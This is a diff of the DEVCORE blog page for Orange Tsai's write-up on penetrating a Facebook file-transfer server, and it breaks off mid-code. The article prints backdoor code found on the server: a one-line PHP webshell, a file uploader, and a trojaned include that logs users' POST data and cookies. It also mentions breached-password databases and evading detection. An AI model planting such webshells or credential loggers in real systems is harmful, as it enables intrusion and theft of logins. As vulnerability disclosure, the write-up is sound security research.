@@ -1,111 +1,493 @@
 
+
 <!DOCTYPE html>
-<html lang="zh-TW">
-  <head>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta charset="utf-8" />
-    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
-    <meta content="width=device-width, initial-scale=1" name="viewport" />
-    <title>How I Hacked Facebook, and Found Someone's Backdoor Script | DEVCORE</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
-    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
-    <meta name="description" property="og:description" content="Bug Bounty Hunting from Pentest View, and How to Find Remote Code Execution and Someone's Backdoor on Facebook Server..." />
-    <meta name="keywords" content="Facebook, BugBounty, RCE, Backdoor, Reconnaissance, Pentest" />
-    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
-    <meta property="og:title" content="How I Hacked Facebook, and Found Someone's Backdoor Script | DEVCORE 戴夫寇爾" />
-    <meta property="og:url" content="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/" />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://devco.re/assets/img/blog/20160421/facebook.jpg" />
-    <meta name="twitter:card" content="summary">
-    <meta name="twitter:site" content="d3vc0r3">
-    <meta name="twitter:title" content="How I Hacked Facebook, and Found Someone's Backdoor Script | DEVCORE 戴夫寇爾">
-    <meta name="twitter:description" content="Bug Bounty Hunting from Pentest View, and How to Find Remote Code Execution and Someone's Backdoor on Facebook Server...">
-    <meta name="twitter:creator" content="d3vc0r3">
-    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20160421/facebook.jpg">
-    <meta name="twitter:domain" content="devco.re">
-    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
-    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
-    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
-    <meta name='yandex-verification' content='4561963cf1d18fe3' />
-    <meta property="fb:admins" content="120968921404653" />
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>How I Hacked Facebook, and Found Someone's Backdoor Script | DEVCORE</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body class="en">
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Services<i class="icon arrow_down"></i></span>
 
-    <link rel="canonical" href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/"/>
-    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+                    <div class="menuItem">
+                        <a href="/en/services/red-team/">
+                            <div class="item">
 
-    <!-- Google Tag Manager -->
-    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
-    <!-- End Google Tag Manager -->
-  </head>
-  <body>
-    <div class="page">
-      <div class="container--wrapper">
-        <div class="topbar">
-          <div class="topbar__brand">
-            <a href="/en/">
-                <div class="logo">
-                  DEVCORE
-                </div></a>
-            <p class="slogan">
-              We offer professional <a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services
-            </p>
-          </div>
-          <div class="drawer" id="drawer">
-            <div class="drawer__container">
-              <nav class="main-menu">
-                <div class="hidden">
-                  Menu
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    Red Team Assessment
+                                </h2>
+                                <p class="two-line">
+                                    Perform comprehensive attack simulation from unlimited aspects to achieve the designated drill scenario without impacting enterprise operations.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    Penetration Testing
+                                </h2>
+                                <p class="two-line">
+                                    Infiltrate designated enterprise systems with hacker mindset and techniques to uncover potential vulnerabilities, assessing the risk of breach or damage to enterprise assets.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    Security Consulting
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in resource distribution and long-term defensive strategy development from the attacker's perspective based on red team assessment.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    Security Training
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in defending and preventing incidents efficiently from the attacker's perspective, including response procedures and analysis of attack targets, techniques, and vulnerabilities.
+                                </p>
+                            </div>
+                        </a>
+
+                    </div>
                 </div>
-                <a href="/en/services/penetration-test" class="main-menu__link mobile-only">Penetration Testing</a>
-                <a href="/en/services/red-team" class="main-menu__link mobile-only">Red Team Assessment</a>
-                <a href="/en/services/security-consulting" class="main-menu__link mobile-only">Consulting</a>
-                <a href="/en/services/security-training" class="main-menu__link mobile-only">Training</a>
-                <a href="/en/about/" class="main-menu__link">Hackers</a><a href="/en/blog/" class="main-menu__link">News</a><a href="/en/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">Search</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
-              </nav>
-              <a href="/en/contact/" class="drawer__contact button--dense">Contact</a>
-              <nav class="lang-menu">
-                <div class="lang-menu__label">
-                  Lang:
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Research<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    Overview
+                                </h2>
+                                <p class="two-line">
+                                    Research leading cybersecurity techniques and trends, perform comprehensive security assessments of enterprise products, and evolve the red team with broad experience.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    Competitions and Awards
+                                </h2>
+                                <p class="two-line">
+                                    Awards from international cybersecurity competitions.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    Enterprise Vulnerability Reports
+                                </h2>
+                                <p class="two-line">
+                                    Research into the risk of enterprise systems, identify potential weaknesses, and report to vendors.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    International Conferences
+                                </h2>
+                                <p class="two-line">
+                                    Publish vulnerability research and share security knowledge at international cybersecurity conferences.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE List
+                                </h2>
+                                <p class="two-line">
+                                    Uncover and report critical vulnerabilities in leading international products and services.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
                 </div>
-                <a href="/" class="lang-menu__link">中文</a>
-                <a href="/en/" class="lang-menu__link">English</a>
-              </nav>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>Company<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                Company Overview
+                            </h2>
+                            <p>
+                                DEVCORE was founded by a world-class white hat hacker team, providing cybersecurity services and focusing on Red Team Assessment and Penetration Testing services.
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/en/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    Team Members
+                                </h2>
+                                <p class="two-line">
+                                    A team of experts with a hacker mindset, exploring new exploitation techniques, and upholding strict morality, self-discipline, and caution.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    Achievements
+                                </h2>
+                                <p class="two-line">
+                                    The history, research achievements, and award information of DEVCORE.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    Corporate Social Responsibility
+                                </h2>
+                                <p class="two-line">
+                                    Provide diverse internship channels and scholarship programs to nurture the next generation and promote cybersecurity awareness.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    Job Opportunities
+                                </h2>
+                                <p class="two-line">
+                                    Join us to secure the world and improve the cybersecurity industry together.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>News<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/en/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    Latest news
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    Media Resources
+                                </h2>
+                                <p>
+                                    Guidelines for the use of the DEVCORE trademark.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/search/">Search</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/contact/">Contact</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>Services</span>
+                <div class="menuItem">
+                    <a href="/en/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                Red Team Assessment
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                Penetration Testing
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                Security Consulting
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                Security Training
+                            </h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
-            <div class="bars">
-              <div class="bar"></div>
-              <div class="bar"></div>
-              <div class="bar"></div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>Research</span>
+                <div class="menuItem">
+                    <a href="/en/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/awards/">
+                        <div class="item">
+                            <h2>Competitions and Awards</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Enterprise Vulnerability Reports</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/talks/">
+                        <div class="item">
+                            <h2>International Conferences</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/cve/">
+                        <div class="item">
+                            <h2>CVE List</h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </button>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>Company</span>
+                <div class="menuItem">
+                    <a href="/en/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>Company Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/our-team/">
+                        <div class="item">
+                            <h2>Team Members</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/history/">
+                        <div class="item">
+                            <h2>Achievements</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/csr/">
+                        <div class="item">
+                            <h2>Corporate Social Responsibility</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/jobs/">
+                        <div class="item">
+                            <h2>Job Opportunities</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>News</span>
+                <div class="menuItem">
+                    <a href="/en/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/en/media-kit/">
+                        <div class="item">
+                            <h2>Media Resources</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/en/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                Search
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                Contact
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/en/blog/">All Articles</a>
+                </li>
+                <li>
+                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
+                </li>
+                <li>
+                    <a href="/en/media-kit/">Media Resources</a>
+                </li>
+            </ul>
         </div>
-      </div><main role="main">
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
+                    <span class="tag">
 
+                      <a href="/en/blog/tag/Facebook/">#Facebook</a> <a href="/en/blog/tag/BugBounty/">#BugBounty</a> <a href="/en/blog/tag/RCE/">#RCE</a> <a href="/en/blog/tag/Backdoor/">#Backdoor</a> <a href="/en/blog/tag/Reconnaissance/">#Reconnaissance</a> <a href="/en/blog/tag/Pentest/">#Pentest</a> 
+                    </span>
+                    <h1>
+                        How I Hacked Facebook, and Found Someone's Backdoor Script
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/en/blog/author/orange">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/en/blog/author/orange">Orange Tsai</a></span>
+                        <span class="date">2016-04-21</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20160421/facebook.jpg"/>
+                    </div>
+                    
 
-          <div class="container--wrapper">
-            <div class="container">
-              <section class="blog-header">
-                <small class="blog-header__category"><a href="/en/blog/category/Case Studies/" style="text-transform: uppercase;">Case Studies</a></small>
-                <img src="https://devco.re/assets/img/blog/20160421/facebook.jpg" class="blog-header__image" alt="How I Hacked Facebook, and Found Someone's Backdoor Script" />
-                <h1 class="blog-header__title">
-                  How I Hacked Facebook, and Found Someone's Backdoor Script
-                </h1>
-                <div class="blog-header__tags">
-                  
-                  <a href="/en/blog/tag/Facebook/" class="blog-header__tag">Facebook</a><a href="/en/blog/tag/BugBounty/" class="blog-header__tag">BugBounty</a><a href="/en/blog/tag/RCE/" class="blog-header__tag">RCE</a><a href="/en/blog/tag/Backdoor/" class="blog-header__tag">Backdoor</a><a href="/en/blog/tag/Reconnaissance/" class="blog-header__tag">Reconnaissance</a><a href="/en/blog/tag/Pentest/" class="blog-header__tag">Pentest</a>
-                </div>
-          
-          
-                <p class="blog-header__info">
-                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="author-name">Orange Tsai</a> <time class="date">on 2016-04-21 </time>
-                </p>
-          
-              </section>
-              <article class="article">
-          <p>by <a href="http://blog.orange.tw/">Orange Tsai</a></p>
+                    <hr>
 
-<p><a href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">How I Hacked Facebook, and Found Someone’s Backdoor Script</a> (English Version)  <br />
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<p>by <a href="http://blog.orange.tw/">Orange Tsai</a></p>
+
+<p><a href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">How I Hacked Facebook, and Found Someone’s Backdoor Script</a> (English Version)<br />
 <a href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/">滲透 Facebook 的思路與發現</a> (中文版本)</p>
 
 <hr />
@@ -139,19 +521,19 @@
 <ol>
   <li>For most enterprises, “<strong>Network Boundary</strong>” is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, it’s impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. That’s why luck is often on the attacker’s side: a vulnerable server on the “border” is enough to grant a ticket to the internal network!</li>
   <li>Lack of awareness in “<strong>Networking Equipment</strong>” protection. Most networking equipment doesn’t offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.</li>
-  <li>Security of people: now we have witnessed the emergence of the “<strong>Breached Database</strong>” (aka “<strong>Social Engineering Database</strong>” in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access…then voilà! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man’s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P  <br />
+  <li>Security of people: now we have witnessed the emergence of the “<strong>Breached Database</strong>” (aka “<strong>Social Engineering Database</strong>” in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access…then voilà! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man’s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P<br />
 <br /></li>
 </ol>
 
 <p>For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tfbnw.net
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tfbnw.net
 </code></pre></div></div>
 
-<p>TFBNW seemed to stand for “<strong>TheFacebook Network</strong>”  <br />
+<p>TFBNW seemed to stand for “<strong>TheFacebook Network</strong>”<br />
 Then I found bellow server through public data</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vpn.tfbnw.net
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vpn.tfbnw.net
 </code></pre></div></div>
 
 <p>WOW. When I accessed vpn.tfbnw.net there’s the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploited…nevertheless, it brought up the beginning of the following story.</p>
@@ -174,13 +556,13 @@ Then I found bellow server through public data</p>
 
 <p>I found a special server among these C Class IPs.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>files.fb.com
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>files.fb.com
 </code></pre></div></div>
 
-<p><img src="/assets/img/blog/20160421/1.jpg" alt="files.fb.com" /><br />
+<p><img src="/assets/img/blog/20160421/1.jpg" alt="files.fb.com" />
 <em>↑ Login Interface of files.fb.com</em></p>
 
-<p><br /><br />
+<p><br />
 Judging from the LOGO and Footer, this seems to be Accellion’s Secure File Transfer (hereafter known as FTA)</p>
 
 <p>FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.</p>
@@ -205,7 +587,7 @@ Judging from the LOGO and Footer, this seems to be Accellion’s Secure File Tra
 
 <p>First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or it’s gonna be messy…</p>
 
-<p>After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T  <br />
+<p>After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T<br />
 And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!</p>
 
 <p>Finally, I found 7 vulnerabilities, including</p>
@@ -228,10 +610,10 @@ And the vulnerabilities which needed to be triggered were not easy to exploit. T
 
 <p>More details will be published after full disclosure policy!</p>
 
-<p><img src="/assets/img/blog/20160421/2.jpg" alt="shell on facebook" /><br />
+<p><img src="/assets/img/blog/20160421/2.jpg" alt="shell on facebook" />
 <em>↑ Using Pre-Auth SQL Injection to Write Webshell</em></p>
 
-<p><br /><br />
+<p><br />
 After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P</p>
 
 <p>There are some restrictions on the server:</p>
@@ -250,16 +632,16 @@ After taking control of the server successfully, the first thing is to check whe
 
 <p>While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.</p>
 
-<p>First of all I found some strange PHP error messages in “<strong>/var/opt/apache/php_error_log</strong>”  <br />
+<p>First of all I found some strange PHP error messages in “<strong>/var/opt/apache/php_error_log</strong>”<br />
 These error messages seemed to be caused by modifying codes online?</p>
 
-<p><img src="/assets/img/blog/20160421/3.jpg" alt="PHP error log" /><br />
+<p><img src="/assets/img/blog/20160421/3.jpg" alt="PHP error log" />
 <em>↑ PHP error log</em></p>
 
-<p><br /><br />
+<p><br />
 I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous “visitors”.</p>
 
-<p><img src="/assets/img/blog/20160421/4.jpg" alt="Webshell on facebook server" /><br />
+<p><img src="/assets/img/blog/20160421/4.jpg" alt="Webshell on facebook server" />
 <em>↑ Webshell on facebook server</em></p>
 
 <p>some contents of the files are as follows:</p>
@@ -268,29 +650,29 @@ I followed the PHP paths in error messages and ended up with discovering suspici
 <pre><code>Right, THAT <a href="http://linux.die.net/man/1/sshpass">sshpass</a></code></pre>
 <div class="highlight-name">bN3d10Aw.php</div>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span> <span class="cp">?&gt;</span></code></pre></figure>
 
 <div class="highlight-name">uploader.php</div>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;f][&quot;</span><span class="nx">tmp_name</span><span class="s2">&quot;], basename(</span><span class="si">$_FILES[&quot;f&quot;]</span><span class="s2">[&quot;</span><span class="nx">name</span><span class="s2">&quot;])); ?&gt;</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f]["</span><span class="n">tmp_name</span><span class="s2">"], basename(</span><span class="nv">$_FILES["f"]["name"]</span><span class="s2">)); ?&gt;</span></code></pre></figure>
 
 <div class="highlight-name">d.php</div>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">include_oncce</span><span class="p">(</span><span class="s2">&quot;/home/seos/courier/remote.inc&quot;</span><span class="p">);</span> <span class="k">echo</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;c&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nf">include_oncce</span><span class="p">(</span><span class="s2">"/home/seos/courier/remote.inc"</span><span class="p">);</span> <span class="k">echo</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"c"</span><span class="p">]);</span> <span class="cp">?&gt;</span></code></pre></figure>
 
 <div class="highlight-name">sclient\_user\_class\_standard.inc</div>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="k">include_once</span><span class="p">(</span><span class="s1">&#39;sclient_user_class_standard.inc.orig&#39;</span><span class="p">);</span>
-<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span> 
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s1">'sclient_user_class_standard.inc.orig'</span><span class="p">);</span>
+<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"/home/seos/courier/B3dKe9sQaa0L.log"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span> 
 <span class="nv">$retries</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="nv">$max_retries</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span> 
 
 <span class="c1">// blah blah blah...</span>
 
-<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s T&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;;POST=&quot;</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;GET=&quot;</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;COOKIE=&quot;</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span> 
